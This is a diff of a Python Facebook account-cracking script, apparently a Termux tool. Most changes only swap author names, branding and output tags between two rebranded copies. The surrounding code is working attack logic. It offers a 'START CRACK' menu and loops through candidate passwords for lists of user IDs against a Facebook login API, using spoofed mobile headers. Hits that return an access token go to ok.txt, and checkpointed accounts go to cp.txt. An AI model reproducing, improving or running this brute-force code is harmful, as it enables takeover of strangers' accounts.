@@ -43,7 +43,7 @@ loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 
 def linex():
 	os.system('echo  "\n ★━━━━━━━━★━━━━━━━━━━━━━━━━━━━━★━━━━━━━━━━━★\n" | lolcat -a -d 2 -s 50')
 def logo():
-	os.system('echo "\n░█████╗░██╗░░░░░██╗\n██╔══██╗██║░░░░░██║\n███████║██║░░░░░██║\n██╔══██║██║░░░░░██║\n██║░░██║███████╗██║\n╚═╝░░╚═╝╚══════╝╚═╝\n    *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n    *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n        *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n  \n    ・．━━━━━━━━━━━━ † ━━━━━━━━━━━━．・\n    ☆ Author: ALI RAZA        ☆\n    ☆ Yt Channel   : Technical Raza        ☆\n    ☆ Whatsapp   : +923047269778     \n    ・．━━━━━━━━━━━━ † ━━━━━━━━━━━━．・" | lolcat -a -d 2 -s 50')	
+	os.system('echo "\n░█████╗░██╗░░░░░██╗\n██╔══██╗██║░░░░░██║\n███████║██║░░░░░██║\n██╔══██║██║░░░░░██║\n██║░░██║███████╗██║\n╚═╝░░╚═╝╚══════╝╚═╝\n    *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n    *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n        *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n *◇*◆*◇*◆*◇*◆*◇*◆*◇*◆*\n  \n    ・．━━━━━━━━━━━━ † ━━━━━━━━━━━━．・\n    ☆ Author: MAHDI HASAN (SHUVO)        ☆\n    ☆ Yt Channel   : NAI         ☆\n    ☆ Whatsapp   : 018874088@     \n    ・．━━━━━━━━━━━━ † ━━━━━━━━━━━━．・" | lolcat -a -d 2 -s 50')	
 
 def main():
 	os.system("clear")
@@ -53,7 +53,7 @@ def main():
 	print("\033[92;1m  [1] START CRACK")
 	print("\033[93;1m  [2] HOW TO GET ACCESS TOKEN")
 	print("\033[94;1m  [3] UPDATE TOOL")
-	print("\033[96;1m  [J] Subscribe My Channel. Technical Raza \033[92;1m♬\033[91;1m♬")
+	print("\033[96;1m  [J] Need a gf (Iam Read in class 10) \033[92;1m♬\033[91;1m♬")
 	print("\033[90;1m  [0] EXIT")
 	print("")
 	log_sel()
@@ -66,7 +66,7 @@ def log_sel():
 	elif sel =="1" or sel =="01":
 		token()
 	elif sel =="2" or sel =="02":
-		subprocess.check_output(["am", "start", "https://web.facebook.com/mahdi80808"])
+		subprocess.check_output(["am", "start", "https://web.facebook.com/mahdi80808/"])
 		main()
 	elif sel =="3" or sel =="03":
 		import os
@@ -82,7 +82,7 @@ def log_sel():
 			print("\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n")
 	        	main()
 	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":
-		subprocess.check_output(["am", "start", "https://web.facebook.com/mahdi80808"])
+		subprocess.check_output(["am", "start", "https://web.facebook.com/mahdi80808/"])
 		main()
 	elif sel =="0" or sel =="00":
 		xox("\n\t\033[91;1m ALLAH HAFIZ SEE YOU AGAIN :)")
@@ -286,7 +286,7 @@ def crack_select1():
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in data.json()['error_msg']:
-					print(" \033[1;33m[MAHDI-CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m[ALI-CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("cp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -298,14 +298,14 @@ def crack_select1():
 					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 					data = requests.get(api, params=params, headers=headers_)
 					if "access_token" in data.text and "EAAAA" in data.text:
-						print(" \033[1;32m[MAHDI-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m[ALI-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in data.json()['error_msg']:
-							print(" \033[1;33m[MAHDI-CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m[ALI-CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("cp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -317,15 +317,14 @@ def crack_select1():
 							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 							data = requests.get(api, params=params, headers=headers_)
 							if "access_token" in data.text and "EAAAA" in data.text:
-								print(" \033[1;32m[MAHDI-OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;32m[ALI-OK] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in data.json()['error_msg']:
-									print(" \033[1;33m[AL
-                     -CP] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m[ALI-CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("cp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -561,7 +560,7 @@ def crack_select():
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in data.json()['error_msg']:
-					print(" \033[1;33m[ALI-CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m[MAHDI-CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("cp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -573,14 +572,14 @@ def crack_select():
 					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 					data = requests.get(api, params=params, headers=headers_)
 					if "access_token" in data.text and "EAAAA" in data.text:
-						print(" \033[1;32m[ALI-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m[MAHDI-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in data.json()['error_msg']:
-							print(" \033[1;33m[ALI-CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m[MAHDI-CP] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("cp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -592,14 +591,14 @@ def crack_select():
 							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 							data = requests.get(api, params=params, headers=headers_)
 							if "access_token" in data.text and "EAAAA" in data.text:
-								print(" \033[1;32m[ALI-OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;32m[MAHDI-OK] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in data.json()['error_msg']:
-									print(" \033[1;33m[ALI-CP] "+uid+" | "+pass3+"\033[0;97m")
+									print(" \033[1;33m[MAHDI-CP] "+uid+" | "+pass3+"\033[0;97m")
 									cp = open("cp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -611,14 +610,14 @@ def crack_select():
 									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 									data = requests.get(api, params=params, headers=headers_)
 									if "access_token" in data.text and "EAAAA" in data.text:
-										print(" \033[1;32m[ALI-OK] "+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;32m[MAHDI-OK] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in data.json()['error_msg']:
-											print(" \033[1;33m[ALI-CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;33m[MAHDI-CP] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("cp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
@@ -630,14 +629,14 @@ def crack_select():
 											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 											data = requests.get(api, params=params, headers=headers_)
 											if "access_token" in data.text and "EAAAA" in data.text:
-												print(" \033[1;32m[ALI-OK] "+uid+" | "+pass5+"\033[0;97m")
+												print(" \033[1;32m[MAHDI-OK] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in data.json()['error_msg']:
-													print(" \033[1;33m[ALI-CP] "+uid+" | "+pass5+"\033[0;97m")
+													print(" \033[1;33m[MAHDI-CP] "+uid+" | "+pass5+"\033[0;97m")
 													cp = open("cp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -649,14 +648,14 @@ def crack_select():
 													headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 													data = requests.get(api, params=params, headers=headers_)
 													if "access_token" in data.text and "EAAAA" in data.text:
-														print(" \033[1;32m[ALI-OK] "+uid+" | "+pass6+"\033[0;97m")
+														print(" \033[1;32m[MAHDI-OK] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in data.json()['error_msg']:
-															print(" \033[1;33m[ALI-CP] "+uid+" | "+pass6+"\033[0;97m")
+															print(" \033[1;33m[MAHDI-CP] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("cp.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
 															cp.close()
@@ -668,14 +667,14 @@ def crack_select():
 															headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
 															data = requests.get(api, params=params, headers=headers_)
 															if "access_token" in data.text and "EAAAA" in data.text:
-																print(" \033[1;32m[ALI-OK] "+uid+" | "+pass7+"\033[0;97m")
+																print(" \033[1;32m[MAHDI-OK] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in data.json()['error_msg']:
-																	print(" \033[1;33m[ALI-CP] "+uid+" | "+pass7+"\033[0;97m")
+																	print(" \033[1;33m[MAHDI-CP] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("cp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
